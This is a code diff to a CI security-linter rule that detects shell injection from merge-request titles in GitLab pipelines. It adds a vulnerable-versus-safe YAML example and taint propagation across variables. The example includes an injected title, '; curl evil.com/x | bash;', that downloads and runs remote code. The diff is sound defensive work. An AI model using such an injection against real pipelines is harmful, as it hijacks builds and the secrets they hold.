@@ -33,6 +33,28 @@ RULE = Rule(
         "controls. Interpolating them into a shell body executes the "
         "crafted content as part of the build."
     ),
+    exploit_example=(
+        "# Vulnerable: an MR titled ``feat: shiny new thing\";\n"
+        "# curl evil.com/x | bash;\"`` executes the curl in the\n"
+        "# build's shell context. The MR author needs no special\n"
+        "# privilege — any branch contributor can open one.\n"
+        "build:\n"
+        "  script:\n"
+        "    - echo \"Building MR $CI_MERGE_REQUEST_TITLE\"\n"
+        "    - ./build.sh\n"
+        "\n"
+        "# Safe: pass the untrusted value through an env var and\n"
+        "# quote it. The shell sees the value as one argument; the\n"
+        "# attacker's injected ``;`` / ``$()`` / backticks are\n"
+        "# literal characters in the printed string, not parsed\n"
+        "# tokens.\n"
+        "build:\n"
+        "  script:\n"
+        "    - echo \"Building MR $MR_TITLE\"\n"
+        "    - ./build.sh\n"
+        "  variables:\n"
+        "    MR_TITLE: $CI_MERGE_REQUEST_TITLE"
+    ),
 )
 
 
@@ -44,11 +66,28 @@ def _tainted_vars(variables_block: Any) -> set[str]:
     """
     if not isinstance(variables_block, dict):
         return set()
-    tainted: set[str] = set()
+    raw_values: dict[str, str] = {}
     for name, value in variables_block.items():
         raw = value.get("value") if isinstance(value, dict) else value
-        if isinstance(raw, str) and UNTRUSTED_VAR_RE.search(raw):
-            tainted.add(str(name))
+        if isinstance(raw, str):
+            raw_values[str(name)] = raw
+    # Seed with variables that directly reference an untrusted CI value.
+    tainted: set[str] = {
+        name for name, raw in raw_values.items()
+        if UNTRUSTED_VAR_RE.search(raw)
+    }
+    # Propagate to a fixpoint: a variable that references an
+    # already-tainted variable (``B: $A`` where ``A`` is tainted) is
+    # itself tainted.
+    changed = True
+    while changed:
+        changed = False
+        for name, raw in raw_values.items():
+            if name in tainted:
+                continue
+            if any(re.search(_gl_ref_pattern(t), raw) for t in tainted):
+                tainted.add(name)
+                changed = True
     return tainted
 
 
